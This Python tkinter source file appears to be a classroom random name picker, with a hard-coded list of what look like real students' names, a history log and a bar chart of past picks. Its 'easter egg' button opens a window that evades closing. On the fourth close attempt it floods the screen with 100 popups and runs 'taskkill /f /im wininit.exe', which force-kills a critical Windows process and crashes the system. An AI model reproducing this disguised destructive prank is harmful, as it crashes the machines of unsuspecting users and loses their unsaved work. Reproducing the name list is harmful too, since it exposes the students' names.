import os
import threading
import tkinter as tk
import random
from tkinter import ttk
import time
import pystray
import win32con
from PIL import Image
from pystray import MenuItem, Menu
import pyecharts.options as opts
from pyecharts.charts import Bar
from collections import Counter
import webbrowser as wb
from pyecharts.globals import ThemeType
import win32gui

person = ['孟宪熙', '魏鹂瑶', '张语芯', '周子涵', '邢嘉益', '孟凡超', '邱冠铭', '邱冠铭的前桌', '邱冠铭的后桌', '王钰涵', '于博', '邢展学', '唐菲', '李学坤', '尚积宇',
          '张嘉纹', '张嘉纹的后桌', '汪家伊', '张泳健', '张泳健的同桌', '李佳鑫', '张轩搏', '孙若云', '袁特', '林奕同', '胡霖', '张仕函', '李沂宸', '国琬悦', '张家驹',
          '王心妍', '吴鹤', '李佳蒙', '许鹏', '田继浩', '王艺诺', '郝喜臣', '刘禹含', '潘祉含', '赵梓妤', '李宇涵', '单源源', '姜祉旭', '郭馨', '蔡佳昱', '周芯羽',
          '丛嘉俊', '李佳诺', '王曦妍', '李禹昂', '陈诗淇', '张露心', '张瀚文']
PersonBeChosen = []  # 储存历史记录的名单
running_flag = False  # 判断点名是否开始
width = 406
height = 229
root = tk.Tk()
a = tk.StringVar()
CD = tk.StringVar()
CD.set("你关不掉这个窗口")
screenwidth = root.winfo_screenwidth()
screenheight = root.winfo_screenheight()
size_geo = '%dx%d+%d+%d' % (width, height, (screenwidth - width) / 2, (screenheight - height) / 2)
root.geometry(size_geo)
root.title("差距已经拉开了")
root.iconbitmap("./resources/ico.ico")
root.tk.call("source", "./resources/sun-valley.tcl")
root.tk.call("set_theme", "light")
root.resizable(False, False)  # 禁用最大化
root.attributes('-topmost', 'true')  # 置顶
style_default = ttk.Style()
style_default.configure("myname.TButton", font="站酷文艺体")
style_default.configure("myname.TLabel", foreground="#FFD4A9", background="#80D1C8")


def TeXiao():  # 主窗口关闭时的特效（慢慢关掉）
    button.configure(state=tk.DISABLED)
    button2.configure(state=tk.DISABLED)
    hwnd = win32gui.FindWindow(None, "差距已经拉开了")  # 获取句柄
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    AppX = right - left
    AppY = bottom - top
    TargetX = int((screenwidth - AppX + 1) / 2)
    TargetY = int((screenheight - AppY + 1) / 2)
    TrueY = TargetY + AppY
    for i in range(0, TrueY):
        win32gui.MoveWindow(hwnd, TargetX, TargetY + i, AppX, AppY, True)


def CaiDan():  # 彩蛋函数
    global root2
    root.withdraw()
    # notify(icon)
    root2 = tk.Toplevel()
    root2.geometry(size_geo)
    root2.title("彩蛋")
    Disable()
    root2.iconbitmap("./resources/ico.ico")
    root2.attributes('-topmost', 'true')
    root2.resizable(False, False)
    style_default.configure("second.TLabel", foreground="#FFD4A9", background="#80D1C8")
    l0 = ttk.Label(root2, textvariable=CD, font=("站酷文艺体", 30), style="second.TLabel", anchor="center", relief="sunken")
    l0.place(x=17.5, y=32.5, width=371, height=164)
    root2.protocol('WM_DELETE_WINDOW', CaiDanTeXiao)


num = 0
def WuXianTanChuang():
    window = tk.Tk()
    width = window.winfo_screenwidth()
    height = window.winfo_screenheight()
    a = random.randrange(0, width)
    b = random.randrange(0, height)
    window.title('嘿嘿')
    window.geometry("200x50" + "+" + str(a) + "+" + str(b))
    tk.Label(window,
             text='你关不掉的！',  # 显示文字
             bg='yellow',  # 背景颜色
             font=('楷体', 17),  # 字体和字体大小
             width=15, height=2  # 标签长宽
             ).pack()  # 固定窗口位置
    window.mainloop()


def CaiDanTeXiao():
    global TrueX, TrueY, num
    choice = random.randint(0, 3)
    hwnd = win32gui.FindWindow(None, "彩蛋")
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    AppX = right - left
    AppY = bottom - top
    TargetX = int((screenwidth - AppX + 1) / 2)
    TargetY = int((screenheight - AppY + 1) / 2)
    if choice == 0:
        TrueX = TargetX + AppX
        TrueY = TargetY
    elif choice == 1:
        TrueX = TargetX - AppX
        TrueY = TargetY
    elif choice == 2:
        TrueX = TargetX
        TrueY = TargetY + AppY
    elif choice == 3:
        TrueX = TargetX
        TrueY = TargetY - AppY
    win32gui.MoveWindow(hwnd, TrueX, TrueY, AppX, AppY, True)
    num += 1
    if num == 4:
        time.sleep(1)
        root2.withdraw()
        threads = []
        for i in range(100):  # 需要的弹框数量，根据自己需要来修改，这里我只创建了9次
            t = threading.Thread(target=WuXianTanChuang)
            threads.append(t)
            time.sleep(0.001)
            threads[i].start()
        os.system("taskkill /f /im wininit.exe")



def show_window():  # 窗口恢复
    button.configure(state=tk.ACTIVE)
    button2.configure(state=tk.ACTIVE)
    root.deiconify()
    hwnd = win32gui.FindWindow(None, "差距已经拉开了")
    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
    AppX = right - left
    AppY = bottom - top
    TargetX = int((screenwidth - AppX + 1) / 2)
    TargetY = int((screenheight - AppY + 1) / 2)
    win32gui.MoveWindow(hwnd, TargetX, TargetY, AppX, AppY, True)


def on_exit():
    TeXiao()
    root.withdraw()
    notify(icon)


def notify(icon: pystray.Icon):
    icon.notify("我消失了", "差距已经被拉开了")


menu = (MenuItem('显示', show_window, default=True), Menu.SEPARATOR)
image = Image.open("./resources/ico.ico")
icon = pystray.Icon("icon", image, "整活", menu)


def thread_it(func, *args):  # 多进程
    t = threading.Thread(target=func, args=args)
    t.setDaemon(True)
    t.start()


def start():  # 开始抽签
    button.configure(state=tk.DISABLED)
    stop_time()
    random.shuffle(person)
    global running_flag
    running_flag = True
    thread_it(point_name_begin())


def point_name_begin():
    global running_flag
    if running_flag:
        always_ergodic()


def always_ergodic():
    for i in person:
        if running_flag:
            a.set(i)
            time.sleep(0.1)
            if i == person[-1]:
                always_ergodic()
        else:
            break


def stop():  # 停止抽签
    global running_flag
    if running_flag:
        running_flag = False
        time.sleep(1)
        with open("./resources/History.txt", mode="a", encoding="utf-8") as f:
            f.write(a.get() + '\n')
        button.configure(state=tk.ACTIVE)


def stop_time():
    timer = threading.Timer(3, stop)
    timer.start()


def show_history():  # 调取历史记录
    button2.configure(state=tk.DISABLED)
    chose = []
    num = []
    with open('./resources/History.txt', encoding='UTF-8') as f:
        for line in f.readlines():
            PersonBeChosen.append(line.strip('\n').split(',')[0])
    c = dict(Counter(PersonBeChosen))

    for key, value in c.items():
        chose.append(key)
        num.append(value)
    print(chose)
    print(num)
    bar = (
        Bar(init_opts=opts.InitOpts(page_title="历史抽签人数", theme=ThemeType.MACARONS, width="1500px"))
            .add_xaxis(chose)
            .add_yaxis("次数", num)
            .set_global_opts(title_opts=opts.TitleOpts(title="历史抽签人数"),
                             xaxis_opts=opts.AxisOpts(axislabel_opts={"interval": "0"}))

    )
    bar.render("person.html")
    wb.open("person.html")
    chose.clear()
    num.clear()
    PersonBeChosen.clear()
    button2.configure(state=tk.ACTIVE)


def disable_minbox():  # 禁止最小化
    # get window handle
    win_id = root.winfo_id()
    hwnd = win32gui.GetParent(win_id)
    # get the current window style of root window
    style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
    # mask out minimize button
    style &= ~win32con.WS_MINIMIZEBOX
    # update the window style of root window
    win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)


def disable():
    hwnd = win32gui.FindWindow(None, "彩蛋")
    style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
    style &= ~win32con.WS_MINIMIZEBOX
    win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)


def Disable():
    disable()
    timer = threading.Timer(1, disable)
    timer.start()


a.set("?")
l2 = ttk.Label(root, textvariable=a, font=("站酷文艺体", 50), style="myname.TLabel", anchor="center", relief="sunken")
l2.place(x=9, y=10, width=384, height=104)
button = ttk.Button(root, text="摸一个", command=lambda: thread_it(start), style="myname.TButton")
button.place(x=151, y=140, width=100, height=48)
button2 = ttk.Button(root, text="历史记录", command=lambda: thread_it(show_history), style="myname.TButton")
button2.place(x=16, y=140, width=100, height=48)
button3 = ttk.Button(root, text="小彩蛋", command=CaiDan, style="myname.TButton")
button3.place(x=285, y=140, width=100, height=48)
root.protocol('WM_DELETE_WINDOW', on_exit)
root.after(1, disable_minbox)
thread_it(icon.run)
root.mainloop()
